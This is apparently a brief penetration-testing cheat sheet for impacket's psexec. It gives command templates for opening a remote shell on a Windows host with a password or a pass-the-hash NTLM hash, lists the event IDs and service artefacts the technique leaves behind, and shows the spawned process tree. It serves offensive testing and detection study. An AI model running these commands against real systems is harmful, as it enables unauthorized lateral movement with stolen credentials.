### Source
https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py  

### Open shell on remote host
```
impacket-psexec <domain>/<user>:<password>@<rhost>
```

### Using hash (hash must be: lmhash:nthash)
```
impacket-psexec -hashes :<ntlmhash> <domain>/<user>@<rhost>
```

### Opsec considerations
```
upload randomly named exe file to C:\Windows

Windows Security Log Event IDs
-Logon (4624) -> multiple
-Special Logon (4672) -> multiple
-A service was installed in the system (4697) 

Windows System Logs
-Service Control Manager (7045)
```

### Running processes
```
gsHtpykm.exe
└── cmd.exe
    └── Conhost.exe
```

